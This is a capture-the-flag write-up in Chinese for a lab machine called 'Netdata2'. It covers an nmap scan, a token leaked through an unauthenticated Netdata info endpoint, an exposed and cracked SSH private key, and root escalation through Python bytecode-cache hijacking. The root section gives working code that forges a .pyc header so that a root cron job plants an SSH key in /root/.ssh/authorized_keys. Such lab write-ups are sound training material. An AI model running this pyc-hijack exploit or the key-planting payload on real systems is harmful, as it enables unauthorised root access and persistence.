---
title: "Netdata2"
date: "2026-08-26"
lastmod: 2026-08-26T09:30:14.363Z
slug: "netdata2"
summary: "python缓存劫持"
tags:
  - "shell"
  - "maze"
  - "python"
categories: []
draft: false
cover: ""
params:
  protected: false
---

# Netdata2

# 端口扫描

始终缺少信息，于是拉大扫描范围

```bash
┌──(lily2663㉿LAPTOP-L8P806AH)-[~]
└─$ nmap 192.168.1.45 -p- -Pn -A
Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-24 23:57 +0800
Nmap scan report for 192.168.1.45
Host is up (0.0014s latency).
Not shown: 65531 closed tcp ports (reset)
PORT      STATE SERVICE  VERSION
22/tcp    open  ssh      OpenSSH 10.3 (protocol 2.0)
80/tcp    open  http     Apache httpd 2.4.67 ((Unix))
|_http-server-header: Apache/2.4.67 (Unix)
| http-methods:
|_  Potentially risky methods: TRACE
|_http-title: dprod - Digital product design agency
8443/tcp  open  http     Werkzeug httpd 3.1.8 (Python 3.14.5)
|_http-title: Site doesn't have a title (application/json).
|_http-server-header: Werkzeug/3.1.8 Python/3.14.5
19999/tcp open  dnp-sec?
| fingerprint-strings:
|   GenericLines:
|     HTTP/1.1 400 Bad Request
|     Connection: close
|     Server: Netdata Embedded HTTP Server v1.47.5
|     Access-Control-Allow-Origin: *
|     Access-Control-Allow-Credentials: true
|     Date: Mon, 24 Aug 2026 15:58:12 GMT
|     Content-Type: text/plain; charset=utf-8
|     Cache-Control: no-cache, no-store, must-revalidate
|     Pragma: no-cache
|     Expires: Mon, 24 Aug 2026 15:58:12 GMT
|     Content-Length: 43
|     X-Transaction-ID: 168d15430bec4ab9953007df1fa3bbf8
|     HTTP method requested is not supported...
|   GetRequest:
|     HTTP/1.1 200 OK
|     Connection: close
|     Server: Netdata Embedded HTTP Server v1.47.5
|     Access-Control-Allow-Origin: *
|     Access-Control-Allow-Credentials: true
|     Date: Wed, 13 May 2026 08:37:07 GMT
|     Content-Type: text/html; charset=utf-8
|     Cache-Control: public
|     Expires: Thu, 14 May 2026 08:37:07 GMT
|     Content-Length: 39655
|     X-Transaction-ID: c7c712fd4fd649bb8109571d60f85dfe
|     <!doctype html><html lang="en"><head><title>netdata dashboard</title><meta name="application-name" content="netdata"><meta http-equiv="Content-Type" content="text/html; charset=utf-8"/><meta charset="utf-8"><meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"><meta name="viewport" content="width=device-width,initial-scale=1"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="black-translucent"><meta name="author" content="costa@tsaousis.gr"><link rel=
|   HTTPOptions:
|     HTTP/1.1 200 OK
|     Connection: close
|     Server: Netdata Embedded HTTP Server v1.47.5
|     Access-Control-Allow-Origin: *
|     Access-Control-Allow-Credentials: true
|     Date: Mon, 24 Aug 2026 15:58:13 GMT
|     Content-Type: text/plain; charset=utf-8
|     Access-Control-Allow-Methods: GET, OPTIONS
|     Access-Control-Allow-Headers: accept, x-requested-with, origin, content-type, cookie, pragma, cache-control, x-auth-token
|     Access-Control-Max-Age: 1209600
|     Content-Length: 2
|_    X-Transaction-ID: 0c9ecdcf490a41eab8a57ed3d2481b09
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port19999-TCP:V=7.99%I=7%D=8/24%Time=6A8C6A14%P=x86_64-pc-linux-gnu%r(G
SF:enericLines,1D4,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConnection:\x20c
SF:lose\r\nServer:\x20Netdata\x20Embedded\x20HTTP\x20Server\x20v1\.47\.5\r
SF:\nAccess-Control-Allow-Origin:\x20\*\r\nAccess-Control-Allow-Credential
SF:s:\x20true\r\nDate:\x20Mon,\x2024\x20Aug\x202026\x2015:58:12\x20GMT\r\n
SF:Content-Type:\x20text/plain;\x20charset=utf-8\r\nCache-Control:\x20no-c
SF:ache,\x20no-store,\x20must-revalidate\r\nPragma:\x20no-cache\r\nExpires
SF::\x20Mon,\x2024\x20Aug\x202026\x2015:58:12\x20GMT\r\nContent-Length:\x2
SF:043\r\nX-Transaction-ID:\x20168d15430bec4ab9953007df1fa3bbf8\r\n\r\nHTT
SF:P\x20method\x20requested\x20is\x20not\x20supported\.\.\.\r\n")%r(GetReq
SF:uest,9C5A,"HTTP/1\.1\x20200\x20OK\r\nConnection:\x20close\r\nServer:\x2
SF:0Netdata\x20Embedded\x20HTTP\x20Server\x20v1\.47\.5\r\nAccess-Control-A
SF:llow-Origin:\x20\*\r\nAccess-Control-Allow-Credentials:\x20true\r\nDate
SF::\x20Wed,\x2013\x20May\x202026\x2008:37:07\x20GMT\r\nContent-Type:\x20t
SF:ext/html;\x20charset=utf-8\r\nCache-Control:\x20public\r\nExpires:\x20T
SF:hu,\x2014\x20May\x202026\x2008:37:07\x20GMT\r\nContent-Length:\x2039655
SF:\r\nX-Transaction-ID:\x20c7c712fd4fd649bb8109571d60f85dfe\r\n\r\n<!doct
SF:ype\x20html><html\x20lang=\"en\"><head><title>netdata\x20dashboard</tit
SF:le><meta\x20name=\"application-name\"\x20content=\"netdata\"><meta\x20h
SF:ttp-equiv=\"Content-Type\"\x20content=\"text/html;\x20charset=utf-8\"/>
SF:<meta\x20charset=\"utf-8\"><meta\x20http-equiv=\"X-UA-Compatible\"\x20c
SF:ontent=\"IE=edge,chrome=1\"><meta\x20name=\"viewport\"\x20content=\"wid
SF:th=device-width,initial-scale=1\"><meta\x20name=\"apple-mobile-web-app-
SF:capable\"\x20content=\"yes\"><meta\x20name=\"apple-mobile-web-app-statu
SF:s-bar-style\"\x20content=\"black-translucent\"><meta\x20name=\"author\"
SF:\x20content=\"costa@tsaousis\.gr\"><link\x20rel=")%r(HTTPOptions,1FB,"H
SF:TTP/1\.1\x20200\x20OK\r\nConnection:\x20close\r\nServer:\x20Netdata\x20
SF:Embedded\x20HTTP\x20Server\x20v1\.47\.5\r\nAccess-Control-Allow-Origin:
SF:\x20\*\r\nAccess-Control-Allow-Credentials:\x20true\r\nDate:\x20Mon,\x2
SF:024\x20Aug\x202026\x2015:58:13\x20GMT\r\nContent-Type:\x20text/plain;\x
SF:20charset=utf-8\r\nAccess-Control-Allow-Methods:\x20GET,\x20OPTIONS\r\n
SF:Access-Control-Allow-Headers:\x20accept,\x20x-requested-with,\x20origin
SF:,\x20content-type,\x20cookie,\x20pragma,\x20cache-control,\x20x-auth-to
SF:ken\r\nAccess-Control-Max-Age:\x201209600\r\nContent-Length:\x202\r\nX-
SF:Transaction-ID:\x200c9ecdcf490a41eab8a57ed3d2481b09\r\n\r\nOK");
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.99%E=4%D=8/24%OT=22%CT=1%CU=35461%PV=Y%DS=2%DC=T%G=Y%TM=6A8C6A3
OS:4%P=x86_64-pc-linux-gnu)SEQ(SP=100%GCD=1%ISR=10A%TI=Z%CI=Z%II=I%TS=22)SE
OS:Q(SP=102%GCD=1%ISR=10E%TI=Z%CI=Z%II=I%TS=21)SEQ(SP=107%GCD=1%ISR=10A%TI=
OS:Z%CI=Z%TS=21)SEQ(SP=108%GCD=1%ISR=109%TI=Z%CI=Z%TS=21)SEQ(SP=F9%GCD=1%IS
OS:R=110%TI=Z%CI=Z%II=I%TS=21)OPS(O1=M5B4ST11NW9%O2=M5B4ST11NW9%O3=M5B4NNT1
OS:1NW9%O4=M5B4ST11NW9%O5=M5B4ST11NW9%O6=M5B4ST11)WIN(W1=FE88%W2=FE88%W3=FE
OS:88%W4=FE88%W5=FE88%W6=FE88)ECN(R=Y%DF=Y%T=40%W=FAF0%O=M5B4NNSNW9%CC=Y%Q=
OS:)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W
OS:=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)
OS:T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S
OS:+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUC
OS:K=A4E6%RUD=G)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=A50
OS:0%RUD=G)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=A51A%RUD
OS:=G)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=A526%RUD=G)U1
OS:(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=A540%RUD=G)IE(R=Y%
OS:DFI=N%T=40%CD=S)

Network Distance: 2 hops

TRACEROUTE (using port 5900/tcp)
HOP RTT     ADDRESS
1   0.32 ms LAPTOP-L8P806AH.mshome.net (172.22.64.1)
2   2.45 ms 192.168.1.45

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 48.53 seconds
```

# USERFLAG

## 信息搜集

80端口，目录爆破等手段并没有得到什么有效信息

![1787587608860](/assets/img/typora/1787587608860.png)

8443端口，Flask/Werkzeug 3.1.8

```
{"message":"Internal Admin Service","status":"admin_service"}
```

19999为Netdata监控面板

扫目录，存在巨量404噪声

进一步探测

发现http://192.168.1.45:19999/api/v1/info无需认证就可以访问

```js
{
    "version":"v1.47.5",
    "uid":"18daade6-779f-11f1-a2a4-0800279840cc",
    "hosts-available":1,
    "mirrored_hosts":["Netdata2"],
    "mirrored_hosts_status":[{
            "hostname":"Netdata2",
            "hops":0,
            "reachable":true,
            "guid":"18daade6-779f-11f1-a2a4-0800279840cc",
            "node_id":null,
            "claim_id":null
        }],
    "alarms":{
        "normal":85,
        "warning":2,
        "critical":0
    },
    "os_name":"Alpine Linux",
    "os_id":"alpine",
    "os_id_like":"unknown",
    "os_version":"unknown",
    "os_version_id":"3.24.0_alpha20260127",
    "os_detection":"/etc/os-release",
    "cores_total":"2",
    "total_disk_space":"10737418240",
    "cpu_freq":"2419000000",
    "ram_total":"4110512128",
    "container_os_name":"none",
    "container_os_id":"none",
    "container_os_id_like":"none",
    "container_os_version":"none",
    "container_os_version_id":"none",
    "container_os_detection":"none",
    "is_k8s_node":"false",
    "kernel_name":"Linux",
    "kernel_version":"7.0.10-0-stable",
    "architecture":"x86_64",
    "virtualization":"kvm",
    "virt_detection":"lscpu",
    "container":"unknown",
    "container_detection":"none",
    "cloud_provider_type":"unknown",
    "cloud_instance_type":"unknown",
    "cloud_instance_region":"unknown",
    "host_labels":{
        "_os_name":"Alpine Linux",
        "_os_version":"unknown",
        "_kernel_version":"7.0.10-0-stable",
        "_system_ram_total":"4110512128",
        "_system_disk_space":"10737418240",
        "_architecture":"x86_64",
        "_virtualization":"kvm",
        "_container":"unknown",
        "_container_detection":"none",
        "_internal_api_url":"http://127.0.0.1:8443/api/flag",
        "_internal_api_auth_header":"X-Internal-Auth",
        "_internal_api_auth_token":"s3cr3t_t0k3n_f0r_4dm1n",
        "_cloud_provider_type":"unknown",
        "_cloud_instance_type":"unknown",
        "_cloud_instance_region":"unknown",
        "_virt_detection":"lscpu",
        "_is_k8s_node":"false",
        "_install_type":"custom",
        "_aclk_available":"true",
        "_mqtt_version":"5",
        "_aclk_proxy":"none",
        "_aclk_ng_new_cloud_protocol":"true",
        "_is_ephemeral":"false",
        "_has_unstable_connection":"false",
        "_is_parent":"false",
        "_hostname":"Netdata2",
        "_os":"linux",
        "_system_cores":"2",
        "_system_cpu_freq":"2419000000"
    },
    "functions":{
        "streaming":{
            "help":"Streaming status for parents and children.",
            "timeout":10,
            "options":["GLOBAL"],
            "tags":"top",
            "access":["signed-in","same-space","sensitive-data"],
            "priority":101
        },
        "netdata-api-calls":{
            "help":"View the progress on the running and latest Netdata API Requests",
            "timeout":10,
            "options":["GLOBAL"],
            "tags":"top",
            "access":["signed-in","same-space","sensitive-data"],
            "priority":102
        },
        "mount-points":{
            "help":"View mount point statistics",
            "timeout":10,
            "options":["GLOBAL"],
            "tags":"top",
            "access":["anonymous-data"],
            "priority":100
        },
        "network-interfaces":{
            "help":"View network interface statistics",
            "timeout":10,
            "options":["GLOBAL"],
            "tags":"top",
            "access":["anonymous-data"],
            "priority":100
        },
        "processes":{
            "help":"Detailed information on the currently running processes.",
            "timeout":10,
            "options":["GLOBAL"],
            "tags":"top",
            "access":["signed-in","same-space","sensitive-data"],
            "priority":10
        },
        "network-connections":{
            "help":"Network connections explorer",
            "timeout":60,
            "options":["GLOBAL"],
            "tags":"top",
            "access":["signed-in","same-space","sensitive-data"],
            "priority":100
        },
        "containers-vms":{
            "help":"View running containers",
            "timeout":10,
            "options":["GLOBAL"],
            "tags":"top",
            "access":["anonymous-data"],
            "priority":50
        },
        "systemd-services":{
            "help":"View systemd services",
            "timeout":10,
            "options":["GLOBAL"],
            "tags":"top",
            "access":["anonymous-data"],
            "priority":33
        },
        "block-devices":{
            "help":"View block device statistics",
            "timeout":10,
            "options":["GLOBAL"],
            "tags":"top",
            "access":["anonymous-data"],
            "priority":100
        }
    },
    "collectors":[{
            "plugin":"idlejitter.plugin",
            "module":""
        },{
            "plugin":"netdata",
            "module":"stats"
        },{
            "plugin":"apps.plugin",
            "module":""
        },{
            "plugin":"nfacct.plugin",
            "module":""
        },{
            "plugin":"ml.plugin",
            "module":"training"
        },{
            "plugin":"ml.plugin",
            "module":"detection"
        },{
            "plugin":"proc.plugin",
            "module":"/proc/stat"
        },{
            "plugin":"proc.plugin",
            "module":"/proc/uptime"
        },{
            "plugin":"proc.plugin",
            "module":"/proc/loadavg"
        },{
            "plugin":"proc.plugin",
            "module":"/proc/sys/fs/file-nr"
        },{
            "plugin":"proc.plugin",
            "module":"/proc/sys/kernel/random/entropy_avail"
        },{
            "plugin":"proc.plugin",
            "module":"/proc/interrupts"
        },{
            "plugin":"proc.plugin",
            "module":"/proc/softirqs"
        },{
            "plugin":"diskspace.plugin",
            "module":""
        },{
            "plugin":"proc.plugin",
            "module":"/proc/vmstat"
        },{
            "plugin":"proc.plugin",
            "module":"/proc/meminfo"
        },{
            "plugin":"proc.plugin",
            "module":"/proc/net/sockstat"
        },{
            "plugin":"proc.plugin",
            "module":"/proc/net/sockstat6"
        },{
            "plugin":"proc.plugin",
            "module":"/proc/net/netstat"
        },{
            "plugin":"proc.plugin",
            "module":"/proc/net/dev"
        },{
            "plugin":"proc.plugin",
            "module":"/proc/net/softnet_stat"
        },{
            "plugin":"proc",
            "module":"/proc/diskstats"
        },{
            "plugin":"proc.plugin",
            "module":"/proc/diskstats"
        },{
            "plugin":"proc.plugin",
            "module":"ipc"
        },{
            "plugin":"proc.plugin",
            "module":"/sys/class/power_supply"
        },{
            "plugin":"timex.plugin",
            "module":""
        }],
    "cloud-enabled":true,
    "cloud-available":true,
    "agent-claimed":false,
    "aclk-available":false,
    "memory-mode":"dbengine",
    "multidb-disk-quota":1024,
    "page-cache-size":32,
    "web-enabled":true,
    "stream-enabled":false,
    "stream-compression":false,
    "https-enabled":true,
    "buildinfo":"Netdata Cloud|Stream Compression|Machine Learning|dbengine|Native HTTPS|TLS Host Verification|zlib|protobuf|JSON-C|libcap|libcrypto|libyaml|libmnl|apps|cgroup Network Tracking|debugfs|IPMI|NFACCT|perf|slabinfo",
    "release-channel":"stable",
    "notification-methods":"",
    "exporting-enabled":false,
    "exporting-connectors":"",
    "allmetrics-prometheus-used":0,
    "allmetrics-shell-used":1,
    "allmetrics-json-used":0,
    "dashboard-used":1,
    "charts-count":540,
    "metrics-count":1224,
    "ml-info":{
        "version":1,
        "enabled":true,
        "min-train-samples":900,
        "max-train-samples":21600,
        "train-every":10800,
        "diff-n":1,
        "smooth-n":3,
        "lag-n":5,
        "random-sampling-ratio":0.2,
        "max-kmeans-iters":0,
        "dimension-anomaly-score-threshold":0.99,
        "anomaly-detection-grouping-method":"average",
        "anomaly-detection-query-duration":300,
        "hosts-to-skip":"!*",
        "charts-to-skip":"anomaly_detection.* netdata.*"
    }
}
```

关键处：

```
_internal_api_url:         http://127.0.0.1:8443/api/flag
_internal_api_auth_header: X-Internal-Auth
_internal_api_auth_token:  s3cr3t_t0k3n_f0r_4dm1n
```

于是构造请求：

```bash
┌──(lily2663㉿LAPTOP-L8P806AH)-[~]
└─$ curl -H "X-Internal-Auth: s3cr3t_t0k3n_f0r_4dm1n" http://192.168.1.45:8443/api/flag
{"flag":"/b7a46cd4-3c6a-4fe9-b432-6aa60fc1c0d7"}
```

这个flag到底是个什么东西？？？后来发现是路径。

## 获取ssh用户名/密钥

多次尝试后，发现在80端口的服务，在该路径暴露了OpenSSH 私钥

```
curl http://192.168.1.45/b7a46cd4-3c6a-4fe9-b432-6aa60fc1c0d7
```

```
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAACmFlczI1Ni1jdHIAAAAGYmNyeXB0AAAAGAAAABDnJvarBy
AaK0VHGUqzKvNJAAAAGAAAAAEAAABoAAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlz
dHAyNTYAAABBBAu0vOq2iiKpRafaALDAzdld1q7etogfJpUys7uQkh0yssPHIOGIlnCVmk
fH+597ZZUha++8yznavl8rqIn4BZcAAACwIeMia8+vQg3Pds4BWlqyuiElAH9cHiZIzeoJ
+awY0UEJFz3Dkrl3ja9wN4mGDnPJ/o9sblQstTDcEKSz9CluQ0MWrAgZ0IM8rmp/b1/NCH
+dAiQcFgnGllwiBvqn+HLzonSdiDa8t2FY7e1PCNwhehmANepB47bl0GbNN+DLiIbr2NK9
Tf4hR4lkfDAJNCuNcAYPFGdeJiSYHZ5pz23C/EdTq4zx1L5fWTedbBgRwUc=
-----END OPENSSH PRIVATE KEY-----
```

### john爆破

```bash
┌──(lily2663㉿LAPTOP-L8P806AH)-[~/netdata2]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt id.hash
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
No password hashes left to crack (see FAQ)

┌──(lily2663㉿LAPTOP-L8P806AH)-[~/netdata2]
└─$ john --show id.hash
id_rsa:legolas

1 password hash cracked, 0 left
```

爆破出passphrase是：

```bash
legolas
```

### ssh-keygen

```bash
┌──(lily2663㉿LAPTOP-L8P806AH)-[~/netdata2]
└─$ ssh-keygen -y -P legolas -f id_rsa
ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBAu0vOq2iiKpRafaALDAzdld1q7etogfJpUys7uQkh0yssPHIOGIlnCVmkfH+597ZZUha++8yznavl8rqIn4BZc= kendrals@Maze
```

于是登录

## userflag

```bash

┌──(lily2663㉿LAPTOP-L8P806AH)-[~/netdata2]
└─$ ssh -i id_rsa kendrals@192.168.1.45
Enter passphrase for key 'id_rsa':
              _
__      _____| | ___ ___  _ __ ___   ___
\ \ /\ / / _ \ |/ __/ _ \| '_ ` _ \ / _ \
 \ V  V /  __/ | (_| (_) | | | | | |  __/
  \_/\_/ \___|_|\___\___/|_| |_| |_|\___|

kendrals@Netdata2:~$ ls
user.txt
kendrals@Netdata2:~$ cat user.txt
flag{user-038b7528863a88af09ef985247ffc3ec}
kendrals@Netdata2:~$

```

# ROOTFLAG

## 信息搜集

直接传并执行linpeas.sh   ，观察linpeas.out中

-rw-rw-rw-    pyc 666所有人可写

```bash
-rw-rw-rw- 1 root root 742 Jul  4 20:28 /opt/backup/__pycache__/backup_utils.cpython-314.pyc
```

```bash
2341  ╔═══════ Interesting writable files owned by me or writable by everyone (not in Home)
2344  /opt/backup/__pycache__
2345  /opt/backup/__pycache__/backup_utils.cpython-314.pyc
```

再看

```bash
-rw-r--r-- 1 root root 1872 Aug 25 01:22 /opt/backup/backup.log
```

01:22，随后看还在刷新，说明该进程一直在跑

查看该目录下文件

```
/opt/backup# ls
__pycache__  backup.log  backup_job.py  backup_utils.py
```

backup_job.py与backup_utils.py

```python
#backup_utils.py
#!/usr/bin/env python3
import os
import datetime

def run_backup():
    print(f"[{datetime.datetime.now()}] Running backup...")
    os.system("echo backup_complete >> /opt/backup/backup.log")# ← 就这行写log
    print("Backup complete")

def cleanup():
    print("Cleaning up old backups...")
```

```python
#backup_job.py（root cron 调用的入口）
#!/usr/bin/env python3
from backup_utils import run_backup

if __name__ == '__main__':
    run_backup()
```

1.得出cron活着，
2.锁定了需要劫持的函数run_backup()，log只是一直在因为run_backup()追加，也就是说，cron调用的就是他，所以要想办法劫持backup_utils.run_backup()，来让root执行我的payload

## 提权

于是接下来编写劫持利用脚本

1.python的import机制

from backup_utils import run_backup

当import backup_utils

```
→ 找 /opt/backup/__pycache__/backup_utils.cpython-314.pyc
  → 校验：magic(版本) + 记录的源码 mtime + 记录的源码 size 是否和 .py 一致
  → 一致 → 直接加载 pyc 里的字节码（根本不看 .py 内容）
  → 不一致 → 重新编译 .py 并覆盖写 pyc（伪造失败）
```

2.pyc的文件头部格式

```
[4B magic]  [4B flags]  [4B mtime]  [4B size]  [marshal 字节码]
magic  = importlib.util.MAGIC_NUMBER   # 版本标识，3.14 是 2b0e0d0a
flags  = 0                             # 0 = 按时间戳校验
mtime  = 源码文件的 mtime              # ← 必须和真源码一模一样
size   = 源码文件大小                  # ← 必须和真源码一模一样
```

3.脚本构造：

```python
import os
PAY="mkdir -p /root/.ssh && chmod 700 /root/.ssh && echo '[YOUR_SSH_PUBLIC_KEY]' >> /root/.ssh/authorized_keys && chmod 600 /root/.ssh/authorized_keys; echo backup_complete >> /opt/backup/backup.log"
## 把 [YOUR_SSH_PUBLIC_KEY] 替换成你自己的 ssh-rsa 公钥
def run_backup():
    os.system(PAY)
def cleanup():
    pass
```

执行

```python
# ① 构造"假的 backup_utils"源码 —— 必须保留 run_backup/cleanup 同名 API
import marshal, struct, importlib.util, os

src = (
    "import os\n"
    "PAY=\"mkdir -p /root/.ssh && chmod 700 /root/.ssh && "
         "echo '[YOUR_SSH_PUBLIC_KEY]' >> /root/.ssh/authorized_keys && chmod 600 /root/.ssh/authorized_keys; "
         "echo backup_complete >> /opt/backup/backup.log\"\n"
    "def run_backup():\n"
    "    os.system(PAY)\n"
    "def cleanup():\n"
    "    pass\n"
)
## 把 [YOUR_SSH_PUBLIC_KEY] 替换成你自己的 ssh-rsa 公钥
#2.编译成 code object（字节码）
code = compile(src, 'backup_utils.py', 'exec')

#3.读真源码的 mtime/size，用于伪造头部
st = os.stat('/opt/backup/backup_utils.py')

#4.拼pyc：magic + flags(0) + mtime + size + 字节码
pyc = (importlib.util.MAGIC_NUMBER
       + struct.pack('<III', 0, int(st.st_mtime), st.st_size)
       + marshal.dumps(code))

#5.覆盖写入 __pycache__
open('/opt/backup/__pycache__/backup_utils.cpython-314.pyc', 'wb').write(pyc)
```

执行过程：

```
root cron（每分钟）
  └→ python3 /opt/backup/backup_job.py
       └→ from backup_utils import run_backup   ← 加载我们的 pyc
       └→ run_backup()                          ← 执行我们的 os.system（以 root身份）
            └→ pay
```

![1787595149667](/assets/img/typora/1787595149667.png)

```bash
flag{root-57ef9bf79ec87b8179360756328fc252}
```

